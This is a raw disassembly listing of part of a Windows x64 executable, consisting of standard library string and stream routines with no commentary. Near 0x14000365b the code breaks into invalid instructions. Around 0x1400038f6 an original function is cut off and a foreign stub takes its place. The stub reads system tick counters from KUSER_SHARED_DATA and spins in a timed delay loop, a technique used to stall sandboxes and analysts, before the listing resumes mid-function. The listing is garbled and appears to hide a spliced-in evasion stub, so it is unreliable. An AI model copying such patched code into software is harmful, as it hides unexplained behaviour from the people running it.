   140003417:	e8 14 95 03 00       	call   0x14003c930
   14000341c:	4c 89 37             	mov    %r14,(%rdi)
   14000341f:	48 8b c7             	mov    %rdi,%rax
   140003422:	4c 8b 6c 24 60       	mov    0x60(%rsp),%r13
   140003427:	4c 8b 64 24 58       	mov    0x58(%rsp),%r12
   14000342c:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   140003431:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   140003436:	48 83 c4 28          	add    $0x28,%rsp
   14000343a:	41 5f                	pop    %r15
   14000343c:	5f                   	pop    %rdi
   14000343d:	5e                   	pop    %rsi
   14000343e:	5b                   	pop    %rbx
   14000343f:	c3                   	ret
   140003440:	e8 5b ee 03 00       	call   0x1400422a0
   140003445:	cc                   	int3
   140003446:	e8 35 74 00 00       	call   0x14000a880
   14000344b:	cc                   	int3
   14000344c:	cc                   	int3
   14000344d:	cc                   	int3
   14000344e:	cc                   	int3
   14000344f:	cc                   	int3
   140003450:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003455:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000345a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000345f:	57                   	push   %rdi
   140003460:	41 56                	push   %r14
   140003462:	41 57                	push   %r15
   140003464:	48 83 ec 20          	sub    $0x20,%rsp
   140003468:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   14000346d:	49 8b f1             	mov    %r9,%rsi
   140003470:	4c 8b f9             	mov    %rcx,%r15
   140003473:	48 3b fa             	cmp    %rdx,%rdi
   140003476:	77 77                	ja     0x1400034ef
   140003478:	48 8b c2             	mov    %rdx,%rax
   14000347b:	48 2b c7             	sub    %rdi,%rax
   14000347e:	4c 3b c0             	cmp    %rax,%r8
   140003481:	77 6c                	ja     0x1400034ef
   140003483:	0f ae e8             	lfence
   140003486:	48 85 ff             	test   %rdi,%rdi
   140003489:	75 05                	jne    0x140003490
   14000348b:	49 8b c0             	mov    %r8,%rax
   14000348e:	eb 66                	jmp    0x1400034f6
   140003490:	45 0f be 31          	movsbl (%r9),%r14d
   140003494:	49 03 c8             	add    %r8,%rcx
   140003497:	49 8b ef             	mov    %r15,%rbp
   14000349a:	48 2b ef             	sub    %rdi,%rbp
   14000349d:	48 03 ea             	add    %rdx,%rbp
   1400034a0:	41 8b d6             	mov    %r14d,%edx
   1400034a3:	4c 8d 45 01          	lea    0x1(%rbp),%r8
   1400034a7:	4c 2b c1             	sub    %rcx,%r8
   1400034aa:	e8 31 af 03 00       	call   0x14003e3e0
   1400034af:	48 8b d8             	mov    %rax,%rbx
   1400034b2:	48 85 c0             	test   %rax,%rax
   1400034b5:	74 38                	je     0x1400034ef
   1400034b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400034be:	00 00 
   1400034c0:	4c 8b c7             	mov    %rdi,%r8
   1400034c3:	48 8b d6             	mov    %rsi,%rdx
   1400034c6:	48 8b cb             	mov    %rbx,%rcx
   1400034c9:	e8 b2 af 03 00       	call   0x14003e480
   1400034ce:	85 c0                	test   %eax,%eax
   1400034d0:	74 3d                	je     0x14000350f
   1400034d2:	48 ff c3             	inc    %rbx
   1400034d5:	4c 8d 45 01          	lea    0x1(%rbp),%r8
   1400034d9:	4c 2b c3             	sub    %rbx,%r8
   1400034dc:	48 8b cb             	mov    %rbx,%rcx
   1400034df:	41 8b d6             	mov    %r14d,%edx
   1400034e2:	e8 f9 ae 03 00       	call   0x14003e3e0
   1400034e7:	48 8b d8             	mov    %rax,%rbx
   1400034ea:	48 85 c0             	test   %rax,%rax
   1400034ed:	75 d1                	jne    0x1400034c0
   1400034ef:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   1400034f6:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400034fb:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140003500:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140003505:	48 83 c4 20          	add    $0x20,%rsp
   140003509:	41 5f                	pop    %r15
   14000350b:	41 5e                	pop    %r14
   14000350d:	5f                   	pop    %rdi
   14000350e:	c3                   	ret
   14000350f:	49 2b df             	sub    %r15,%rbx
   140003512:	48 8b c3             	mov    %rbx,%rax
   140003515:	eb df                	jmp    0x1400034f6
   140003517:	cc                   	int3
   140003518:	cc                   	int3
   140003519:	cc                   	int3
   14000351a:	cc                   	int3
   14000351b:	cc                   	int3
   14000351c:	cc                   	int3
   14000351d:	cc                   	int3
   14000351e:	cc                   	int3
   14000351f:	cc                   	int3
   140003520:	40 53                	rex push %rbx
   140003522:	48 83 ec 20          	sub    $0x20,%rsp
   140003526:	49 8b d8             	mov    %r8,%rbx
   140003529:	48 3b ca             	cmp    %rdx,%rcx
   14000352c:	74 54                	je     0x140003582
   14000352e:	48 8b c3             	mov    %rbx,%rax
   140003531:	4c 8d 41 18          	lea    0x18(%rcx),%r8
   140003535:	48 2b c1             	sub    %rcx,%rax
   140003538:	45 33 d2             	xor    %r10d,%r10d
   14000353b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003540:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003543:	4d 8d 40 20          	lea    0x20(%r8),%r8
   140003547:	0f 11 03             	movups %xmm0,(%rbx)
   14000354a:	4e 89 54 00 d8       	mov    %r10,-0x28(%rax,%r8,1)
   14000354f:	49 8d 48 e8          	lea    -0x18(%r8),%rcx
   140003553:	4d 89 54 00 e0       	mov    %r10,-0x20(%r8,%rax,1)
   140003558:	41 0f 10 40 c8       	movups -0x38(%r8),%xmm0
   14000355d:	0f 11 03             	movups %xmm0,(%rbx)
   140003560:	41 0f 10 48 d8       	movups -0x28(%r8),%xmm1
   140003565:	0f 11 4b 10          	movups %xmm1,0x10(%rbx)
   140003569:	4d 89 50 d8          	mov    %r10,-0x28(%r8)
   14000356d:	48 83 c3 20          	add    $0x20,%rbx
   140003571:	49 c7 40 e0 0f 00 00 	movq   $0xf,-0x20(%r8)
   140003578:	00 
   140003579:	45 88 50 c8          	mov    %r10b,-0x38(%r8)
   14000357d:	48 3b ca             	cmp    %rdx,%rcx
   140003580:	75 be                	jne    0x140003540
   140003582:	4d 8b c1             	mov    %r9,%r8
   140003585:	48 8b d3             	mov    %rbx,%rdx
   140003588:	48 8b cb             	mov    %rbx,%rcx
   14000358b:	e8 c0 f8 ff ff       	call   0x140002e50
   140003590:	48 8b c3             	mov    %rbx,%rax
   140003593:	48 83 c4 20          	add    $0x20,%rsp
   140003597:	5b                   	pop    %rbx
   140003598:	c3                   	ret
   140003599:	cc                   	int3
   14000359a:	cc                   	int3
   14000359b:	cc                   	int3
   14000359c:	cc                   	int3
   14000359d:	cc                   	int3
   14000359e:	cc                   	int3
   14000359f:	cc                   	int3
   1400035a0:	40 53                	rex push %rbx
   1400035a2:	56                   	push   %rsi
   1400035a3:	57                   	push   %rdi
   1400035a4:	48 83 ec 20          	sub    $0x20,%rsp
   1400035a8:	48 8b f1             	mov    %rcx,%rsi
   1400035ab:	33 d2                	xor    %edx,%edx
   1400035ad:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400035b2:	e8 8d 67 03 00       	call   0x140039d44
   1400035b7:	90                   	nop
   1400035b8:	48 8b 3d 71 18 08 00 	mov    0x81871(%rip),%rdi        # 0x140084e30
   1400035bf:	48 89 7c 24 58       	mov    %rdi,0x58(%rsp)
   1400035c4:	48 8b 15 cd 23 08 00 	mov    0x823cd(%rip),%rdx        # 0x140085998
   1400035cb:	48 85 d2             	test   %rdx,%rdx
   1400035ce:	75 3c                	jne    0x14000360c
   1400035d0:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   1400035d5:	e8 6a 67 03 00       	call   0x140039d44
   1400035da:	48 83 3d b6 23 08 00 	cmpq   $0x0,0x823b6(%rip)        # 0x140085998
   1400035e1:	00 
   1400035e2:	75 17                	jne    0x1400035fb
   1400035e4:	8b 05 96 23 08 00    	mov    0x82396(%rip),%eax        # 0x140085980
   1400035ea:	ff c0                	inc    %eax
   1400035ec:	89 05 8e 23 08 00    	mov    %eax,0x8238e(%rip)        # 0x140085980
   1400035f2:	48 98                	cltq
   1400035f4:	48 89 05 9d 23 08 00 	mov    %rax,0x8239d(%rip)        # 0x140085998
   1400035fb:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140003600:	e8 b7 67 03 00       	call   0x140039dbc
   140003605:	48 8b 15 8c 23 08 00 	mov    0x8238c(%rip),%rdx        # 0x140085998
   14000360c:	48 8b ce             	mov    %rsi,%rcx
   14000360f:	e8 fc 6e 00 00       	call   0x14000a510
   140003614:	48 8b d8             	mov    %rax,%rbx
   140003617:	48 85 c0             	test   %rax,%rax
   14000361a:	75 46                	jne    0x140003662
   14000361c:	48 85 ff             	test   %rdi,%rdi
   14000361f:	74 05                	je     0x140003626
   140003621:	48 8b df             	mov    %rdi,%rbx
   140003624:	eb 3c                	jmp    0x140003662
   140003626:	48 8b d6             	mov    %rsi,%rdx
   140003629:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000362e:	e8 1d 6d 00 00       	call   0x14000a350
   140003633:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140003637:	74 3e                	je     0x140003677
   140003639:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   14000363e:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   140003643:	48 8b cb             	mov    %rbx,%rcx
   140003646:	e8 31 6c 03 00       	call   0x14003a27c
   14000364b:	48 8b 03             	mov    (%rbx),%rax
   14000364e:	48 8b cb             	mov    %rbx,%rcx
   140003651:	48 8b 40 08          	mov    0x8(%rax),%rax
   140003655:	ff 15 85 fd 05 00    	call   *0x5fd85(%rip)        # 0x1400633e0
   14000365b:	48 89 1d ce 0f 85 ac 	mov    %rbx,-0x537af032(%rip)        # 0xec854630
   140003662:	e3 ff                	jrcxz  0x140003663
   140003664:	ff                   	ljmp   (bad)
   140003665:	e8 8c 02 00 00       	call   0x1400038f6
   14000366a:	e8 1a 05 00 00       	call   0x140003b89
   14000366f:	c3                   	ret
   140003670:	83 c4 20             	add    $0x20,%esp
   140003673:	5f                   	pop    %rdi
   140003674:	5e                   	pop    %rsi
   140003675:	5b                   	pop    %rbx
   140003676:	c3                   	ret
   140003677:	e8 20 f5 03 00       	call   0x140042b9c
   14000367c:	90                   	nop
   14000367d:	cc                   	int3
   14000367e:	cc                   	int3
   14000367f:	cc                   	int3
   140003680:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003685:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000368a:	55                   	push   %rbp
   14000368b:	56                   	push   %rsi
   14000368c:	57                   	push   %rdi
   14000368d:	41 56                	push   %r14
   14000368f:	41 57                	push   %r15
   140003691:	48 83 ec 30          	sub    $0x30,%rsp
   140003695:	41 0f b6 e8          	movzbl %r8b,%ebp
   140003699:	4c 8b f2             	mov    %rdx,%r14
   14000369c:	48 8b d9             	mov    %rcx,%rbx
   14000369f:	45 33 ff             	xor    %r15d,%r15d
   1400036a2:	44 89 7c 24 78       	mov    %r15d,0x78(%rsp)
   1400036a7:	45 85 c9             	test   %r9d,%r9d
   1400036aa:	74 2d                	je     0x1400036d9
   1400036ac:	48 8d 05 f5 08 06 00 	lea    0x608f5(%rip),%rax        # 0x140063fa8
   1400036b3:	48 89 01             	mov    %rax,(%rcx)
   1400036b6:	4c 89 79 20          	mov    %r15,0x20(%rcx)
   1400036ba:	4c 89 79 48          	mov    %r15,0x48(%rcx)
   1400036be:	4c 89 79 50          	mov    %r15,0x50(%rcx)
   1400036c2:	4c 89 79 58          	mov    %r15,0x58(%rcx)
   1400036c6:	48 8d 05 cb 08 06 00 	lea    0x608cb(%rip),%rax        # 0x140063f98
   1400036cd:	48 89 41 18          	mov    %rax,0x18(%rcx)
   1400036d1:	c7 44 24 78 01 00 00 	movl   $0x1,0x78(%rsp)
   1400036d8:	00 
   1400036d9:	48 8b 01             	mov    (%rcx),%rax
   1400036dc:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400036e0:	48 8d 05 b9 08 06 00 	lea    0x608b9(%rip),%rax        # 0x140063fa0
   1400036e7:	48 89 04 19          	mov    %rax,(%rcx,%rbx,1)
   1400036eb:	48 8b 03             	mov    (%rbx),%rax
   1400036ee:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400036f2:	8d 51 e8             	lea    -0x18(%rcx),%edx
   1400036f5:	89 54 19 fc          	mov    %edx,-0x4(%rcx,%rbx,1)
   1400036f9:	4c 89 7b 08          	mov    %r15,0x8(%rbx)
   1400036fd:	48 8b 03             	mov    (%rbx),%rax
   140003700:	48 63 78 04          	movslq 0x4(%rax),%rdi
   140003704:	48 03 fb             	add    %rbx,%rdi
   140003707:	4c 89 7f 40          	mov    %r15,0x40(%rdi)
   14000370b:	4c 89 7f 08          	mov    %r15,0x8(%rdi)
   14000370f:	44 89 7f 14          	mov    %r15d,0x14(%rdi)
   140003713:	c7 47 18 01 02 00 00 	movl   $0x201,0x18(%rdi)
   14000371a:	48 c7 47 20 06 00 00 	movq   $0x6,0x20(%rdi)
   140003721:	00 
   140003722:	4c 89 7f 28          	mov    %r15,0x28(%rdi)
   140003726:	4c 89 7f 30          	mov    %r15,0x30(%rdi)
   14000372a:	4c 89 7f 38          	mov    %r15,0x38(%rdi)
   14000372e:	44 89 7f 10          	mov    %r15d,0x10(%rdi)
   140003732:	b9 10 00 00 00       	mov    $0x10,%ecx
   140003737:	e8 4c 80 03 00       	call   0x14003b788
   14000373c:	48 8b f0             	mov    %rax,%rsi
   14000373f:	48 85 c0             	test   %rax,%rax
   140003742:	74 0d                	je     0x140003751
   140003744:	b1 01                	mov    $0x1,%cl
   140003746:	e8 71 6b 03 00       	call   0x14003a2bc
   14000374b:	48 89 46 08          	mov    %rax,0x8(%rsi)
   14000374f:	eb 03                	jmp    0x140003754
   140003751:	49 8b f7             	mov    %r15,%rsi
   140003754:	48 89 77 40          	mov    %rsi,0x40(%rdi)
   140003758:	4c 89 77 48          	mov    %r14,0x48(%rdi)
   14000375c:	4c 89 7f 50          	mov    %r15,0x50(%rdi)
   140003760:	48 8b 76 08          	mov    0x8(%rsi),%rsi
   140003764:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140003769:	48 8b 06             	mov    (%rsi),%rax
   14000376c:	48 8b ce             	mov    %rsi,%rcx
   14000376f:	48 8b 40 08          	mov    0x8(%rax),%rax
   140003773:	ff 15 67 fc 05 00    	call   *0x5fc67(%rip)        # 0x1400633e0
   140003779:	90                   	nop
   14000377a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000377f:	e8 1c fe ff ff       	call   0x1400035a0
   140003784:	4c 8b c0             	mov    %rax,%r8
   140003787:	48 8b 08             	mov    (%rax),%rcx
   14000378a:	48 8b 41 40          	mov    0x40(%rcx),%rax
   14000378e:	b2 20                	mov    $0x20,%dl
   140003790:	49 8b c8             	mov    %r8,%rcx
   140003793:	ff 15 47 fc 05 00    	call   *0x5fc47(%rip)        # 0x1400633e0
   140003799:	44 0f b6 f0          	movzbl %al,%r14d
   14000379d:	48 85 f6             	test   %rsi,%rsi
   1400037a0:	74 2c                	je     0x1400037ce
   1400037a2:	4c 8b 06             	mov    (%rsi),%r8
   1400037a5:	48 8b ce             	mov    %rsi,%rcx
   1400037a8:	49 8b 40 10          	mov    0x10(%r8),%rax
   1400037ac:	ff 15 2e fc 05 00    	call   *0x5fc2e(%rip)        # 0x1400633e0
   1400037b2:	4c 8b c0             	mov    %rax,%r8
   1400037b5:	48 85 c0             	test   %rax,%rax
   1400037b8:	74 14                	je     0x1400037ce
   1400037ba:	48 8b 08             	mov    (%rax),%rcx
   1400037bd:	48 8b 01             	mov    (%rcx),%rax
   1400037c0:	ba 01 00 00 00       	mov    $0x1,%edx
   1400037c5:	49 8b c8             	mov    %r8,%rcx
   1400037c8:	ff 15 12 fc 05 00    	call   *0x5fc12(%rip)        # 0x1400633e0
   1400037ce:	44 88 77 58          	mov    %r14b,0x58(%rdi)
   1400037d2:	48 83 7f 48 00       	cmpq   $0x0,0x48(%rdi)
   1400037d7:	75 0f                	jne    0x1400037e8
   1400037d9:	45 33 c0             	xor    %r8d,%r8d
   1400037dc:	41 8d 50 04          	lea    0x4(%r8),%edx
   1400037e0:	48 8b cf             	mov    %rdi,%rcx
   1400037e3:	e8 68 80 00 00       	call   0x14000b850
   1400037e8:	40 84 ed             	test   %bpl,%bpl
   1400037eb:	74 09                	je     0x1400037f6
   1400037ed:	48 8b cf             	mov    %rdi,%rcx
   1400037f0:	e8 d7 70 03 00       	call   0x14003a8cc
   1400037f5:	90                   	nop
   1400037f6:	48 8b c3             	mov    %rbx,%rax
   1400037f9:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1400037fe:	48 83 c4 30          	add    $0x30,%rsp
   140003802:	41 5f                	pop    %r15
   140003804:	41 5e                	pop    %r14
   140003806:	5f                   	pop    %rdi
   140003807:	5e                   	pop    %rsi
   140003808:	5d                   	pop    %rbp
   140003809:	c3                   	ret
   14000380a:	cc                   	int3
   14000380b:	cc                   	int3
   14000380c:	cc                   	int3
   14000380d:	cc                   	int3
   14000380e:	cc                   	int3
   14000380f:	cc                   	int3
   140003810:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003815:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000381a:	57                   	push   %rdi
   14000381b:	48 83 ec 20          	sub    $0x20,%rsp
   14000381f:	48 8b d9             	mov    %rcx,%rbx
   140003822:	48 8d 05 97 07 06 00 	lea    0x60797(%rip),%rax        # 0x140063fc0
   140003829:	48 89 01             	mov    %rax,(%rcx)
   14000382c:	b9 10 00 00 00       	mov    $0x10,%ecx
   140003831:	e8 52 7f 03 00       	call   0x14003b788
   140003836:	48 8b f8             	mov    %rax,%rdi
   140003839:	33 f6                	xor    %esi,%esi
   14000383b:	48 85 c0             	test   %rax,%rax
   14000383e:	74 0d                	je     0x14000384d
   140003840:	b1 01                	mov    $0x1,%cl
   140003842:	e8 75 6a 03 00       	call   0x14003a2bc
   140003847:	48 89 47 08          	mov    %rax,0x8(%rdi)
   14000384b:	eb 03                	jmp    0x140003850
   14000384d:	48 8b fe             	mov    %rsi,%rdi
   140003850:	48 89 7b 60          	mov    %rdi,0x60(%rbx)
   140003854:	4c 8d 53 08          	lea    0x8(%rbx),%r10
   140003858:	4c 89 53 18          	mov    %r10,0x18(%rbx)
   14000385c:	4c 8d 43 10          	lea    0x10(%rbx),%r8
   140003860:	4c 89 43 20          	mov    %r8,0x20(%rbx)
   140003864:	4c 8d 4b 28          	lea    0x28(%rbx),%r9
   140003868:	4c 89 4b 38          	mov    %r9,0x38(%rbx)
   14000386c:	48 8d 4b 30          	lea    0x30(%rbx),%rcx
   140003870:	48 89 4b 40          	mov    %rcx,0x40(%rbx)
   140003874:	48 8d 53 48          	lea    0x48(%rbx),%rdx
   140003878:	48 89 53 50          	mov    %rdx,0x50(%rbx)
   14000387c:	48 8d 43 4c          	lea    0x4c(%rbx),%rax
   140003880:	48 89 43 58          	mov    %rax,0x58(%rbx)
   140003884:	49 89 30             	mov    %rsi,(%r8)
   140003887:	48 89 31             	mov    %rsi,(%rcx)
   14000388a:	89 30                	mov    %esi,(%rax)
   14000388c:	49 89 32             	mov    %rsi,(%r10)
   14000388f:	49 89 31             	mov    %rsi,(%r9)
   140003892:	89 32                	mov    %esi,(%rdx)
   140003894:	48 8b c3             	mov    %rbx,%rax
   140003897:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000389c:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400038a1:	48 83 c4 20          	add    $0x20,%rsp
   1400038a5:	5f                   	pop    %rdi
   1400038a6:	c3                   	ret
   1400038a7:	cc                   	int3
   1400038a8:	cc                   	int3
   1400038a9:	cc                   	int3
   1400038aa:	cc                   	int3
   1400038ab:	cc                   	int3
   1400038ac:	cc                   	int3
   1400038ad:	cc                   	int3
   1400038ae:	cc                   	int3
   1400038af:	cc                   	int3
   1400038b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400038b5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400038ba:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400038bf:	41 56                	push   %r14
   1400038c1:	48 83 ec 20          	sub    $0x20,%rsp
   1400038c5:	33 c0                	xor    %eax,%eax
   1400038c7:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400038ca:	0f 11 01             	movups %xmm0,(%rcx)
   1400038cd:	48 89 41 10          	mov    %rax,0x10(%rcx)
   1400038d1:	4c 8b f2             	mov    %rdx,%r14
   1400038d4:	48 89 41 18          	mov    %rax,0x18(%rcx)
   1400038d8:	48 8b d9             	mov    %rcx,%rbx
   1400038db:	48 83 7a 18 10       	cmpq   $0x10,0x18(%rdx)
   1400038e0:	48 8b 72 10          	mov    0x10(%rdx),%rsi
   1400038e4:	72 03                	jb     0x1400038e9
   1400038e6:	4c 8b 32             	mov    (%rdx),%r14
   1400038e9:	48 bf ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rdi
   1400038f0:	ff ff 7f 
   1400038f3:	48 3b f7             	cmp    %rdi,%rsi
   1400038f6:	48 83 ec 38          	sub    $0x38,%rsp
   1400038fa:	e8 57 00 00 00       	call   0x140003956
   1400038ff:	89 44 24 34          	mov    %eax,0x34(%rsp)
   140003903:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   14000390a:	00 
   14000390b:	81 7c 24 30 b8 0b 00 	cmpl   $0xbb8,0x30(%rsp)
   140003912:	00 
   140003913:	0f 83 32 00 00 00    	jae    0x14000394b
   140003919:	e8 38 00 00 00       	call   0x140003956
   14000391e:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   140003922:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   140003926:	2b 44 24 34          	sub    0x34(%rsp),%eax
   14000392a:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000392e:	81 7c 24 30 dc 05 00 	cmpl   $0x5dc,0x30(%rsp)
   140003935:	00 
   140003936:	0f 83 0a 00 00 00    	jae    0x140003946
   14000393c:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140003940:	d1 e0                	shl    $1,%eax
   140003942:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140003946:	e9 c0 ff ff ff       	jmp    0x14000390b
   14000394b:	48 83 c4 38          	add    $0x38,%rsp
   14000394f:	c3                   	ret
   140003950:	cc                   	int3
   140003951:	cc                   	int3
   140003952:	cc                   	int3
   140003953:	cc                   	int3
   140003954:	cc                   	int3
   140003955:	cc                   	int3
   140003956:	48 83 ec 38          	sub    $0x38,%rsp
   14000395a:	b8 04 00 fe 7f       	mov    $0x7ffe0004,%eax
   14000395f:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140003964:	b8 24 03 fe 7f       	mov    $0x7ffe0324,%eax
   140003969:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000396e:	b8 20 03 fe 7f       	mov    $0x7ffe0320,%eax
   140003973:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003978:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000397d:	8b 00                	mov    (%rax),%eax
   14000397f:	89 44 24 1c          	mov    %eax,0x1c(%rsp)
   140003983:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140003988:	8b 00                	mov    (%rax),%eax
   14000398a:	89 44 24 18          	mov    %eax,0x18(%rsp)
   14000398e:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140003993:	8b 00                	mov    (%rax),%eax
   140003995:	89 44 24 14          	mov    %eax,0x14(%rsp)
   140003999:	8b 44 24 18          	mov    0x18(%rsp),%eax
   14000399d:	c1 e0 08             	shl    $0x8,%eax
   1400039a0:	89 44 24 10          	mov    %eax,0x10(%rsp)
   1400039a4:	8b 44 24 1c          	mov    0x1c(%rsp),%eax
   1400039a8:	0f af 44 24 10       	imul   0x10(%rsp),%eax
   1400039ad:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   1400039b1:	8b 44 24 14          	mov    0x14(%rsp),%eax
   1400039b5:	8b 4c 24 1c          	mov    0x1c(%rsp),%ecx
   1400039b9:	48 0f af c1          	imul   %rcx,%rax
   1400039bd:	89 44 24 08          	mov    %eax,0x8(%rsp)
   1400039c1:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   1400039c5:	8b 4c 24 08          	mov    0x8(%rsp),%ecx
   1400039c9:	c1 e9 18             	shr    $0x18,%ecx
   1400039cc:	01 c8                	add    %ecx,%eax
   1400039ce:	89 44 24 04          	mov    %eax,0x4(%rsp)
   1400039d2:	8b 44 24 04          	mov    0x4(%rsp),%eax
   1400039d6:	48 83 c4 38          	add    $0x38,%rsp
   1400039da:	c3                   	ret
   1400039db:	4c 8b fa             	mov    %rdx,%r15
   1400039de:	48 8b f9             	mov    %rcx,%rdi
   1400039e1:	e8 2a fe ff ff       	call   0x140003810
   1400039e6:	90                   	nop
   1400039e7:	48 8d 05 4a 06 06 00 	lea    0x6064a(%rip),%rax        # 0x140064038
   1400039ee:	48 89 07             	mov    %rax,(%rdi)
   1400039f1:	8b d3                	mov    %ebx,%edx
   1400039f3:	f7 d2                	not    %edx
   1400039f5:	83 e2 01             	and    $0x1,%edx
   1400039f8:	c1 e2 02             	shl    $0x2,%edx
   1400039fb:	8b ca                	mov    %edx,%ecx
   1400039fd:	83 c9 02             	or     $0x2,%ecx
   140003a00:	f6 c3 02             	test   $0x2,%bl
   140003a03:	0f 45 ca             	cmovne %edx,%ecx
   140003a06:	8b d1                	mov    %ecx,%edx
   140003a08:	83 ca 08             	or     $0x8,%edx
   140003a0b:	f6 c3 08             	test   $0x8,%bl
   140003a0e:	0f 44 d1             	cmove  %ecx,%edx
   140003a11:	8b f2                	mov    %edx,%esi
   140003a13:	83 ce 10             	or     $0x10,%esi
   140003a16:	f6 c3 04             	test   $0x4,%bl
   140003a19:	0f 44 f2             	cmove  %edx,%esi
   140003a1c:	4d 8b 77 10          	mov    0x10(%r15),%r14
   140003a20:	49 83 7f 18 10       	cmpq   $0x10,0x18(%r15)
   140003a25:	72 03                	jb     0x140003a2a
   140003a27:	4d 8b 3f             	mov    (%r15),%r15
   140003a2a:	49 81 fe ff ff ff 7f 	cmp    $0x7fffffff,%r14
   140003a31:	0f 87 cc 00 00 00    	ja     0x140003b03
   140003a37:	4d 85 f6             	test   %r14,%r14
   140003a3a:	0f 84 a1 00 00 00    	je     0x140003ae1
   140003a40:	8b c6                	mov    %esi,%eax
   140003a42:	83 e0 06             	and    $0x6,%eax
   140003a45:	3c 06                	cmp    $0x6,%al
   140003a47:	0f 84 94 00 00 00    	je     0x140003ae1
   140003a4d:	0f ae e8             	lfence
   140003a50:	49 8b ce             	mov    %r14,%rcx
   140003a53:	e8 d8 f2 ff ff       	call   0x140002d30
   140003a58:	48 8b d8             	mov    %rax,%rbx
   140003a5b:	4d 8b c6             	mov    %r14,%r8
   140003a5e:	49 8b d7             	mov    %r15,%rdx
   140003a61:	48 8b c8             	mov    %rax,%rcx
   140003a64:	e8 c7 8e 03 00       	call   0x14003c930
   140003a69:	49 8d 14 1e          	lea    (%r14,%rbx,1),%rdx
   140003a6d:	48 89 57 68          	mov    %rdx,0x68(%rdi)
   140003a71:	44 8b ce             	mov    %esi,%r9d
   140003a74:	41 83 e1 04          	and    $0x4,%r9d
   140003a78:	44 8b c3             	mov    %ebx,%r8d
   140003a7b:	75 16                	jne    0x140003a93
   140003a7d:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   140003a81:	48 89 19             	mov    %rbx,(%rcx)
   140003a84:	48 8b 47 38          	mov    0x38(%rdi),%rax
   140003a88:	48 89 18             	mov    %rbx,(%rax)
   140003a8b:	2b d3                	sub    %ebx,%edx
   140003a8d:	48 8b 47 50          	mov    0x50(%rdi),%rax
   140003a91:	89 10                	mov    %edx,(%rax)
   140003a93:	40 f6 c6 02          	test   $0x2,%sil
   140003a97:	75 43                	jne    0x140003adc
   140003a99:	48 8b 57 68          	mov    0x68(%rdi),%rdx
   140003a9d:	40 f6 c6 18          	test   $0x18,%sil
   140003aa1:	48 8b cb             	mov    %rbx,%rcx
   140003aa4:	48 0f 45 ca          	cmovne %rdx,%rcx
   140003aa8:	48 8b 47 20          	mov    0x20(%rdi),%rax
   140003aac:	48 89 18             	mov    %rbx,(%rax)
   140003aaf:	48 8b 47 40          	mov    0x40(%rdi),%rax
   140003ab3:	48 89 08             	mov    %rcx,(%rax)
   140003ab6:	2b d1                	sub    %ecx,%edx
   140003ab8:	48 8b 47 58          	mov    0x58(%rdi),%rax
   140003abc:	89 10                	mov    %edx,(%rax)
   140003abe:	45 85 c9             	test   %r9d,%r9d
   140003ac1:	74 19                	je     0x140003adc
   140003ac3:	48 8b 47 18          	mov    0x18(%rdi),%rax
   140003ac7:	48 89 18             	mov    %rbx,(%rax)
   140003aca:	48 8b 47 38          	mov    0x38(%rdi),%rax
   140003ace:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
   140003ad5:	48 8b 47 50          	mov    0x50(%rdi),%rax
   140003ad9:	44 89 00             	mov    %r8d,(%rax)
   140003adc:	83 ce 01             	or     $0x1,%esi
   140003adf:	eb 08                	jmp    0x140003ae9
   140003ae1:	48 c7 47 68 00 00 00 	movq   $0x0,0x68(%rdi)
   140003ae8:	00 
   140003ae9:	89 77 70             	mov    %esi,0x70(%rdi)
   140003aec:	48 8b c7             	mov    %rdi,%rax
   140003aef:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
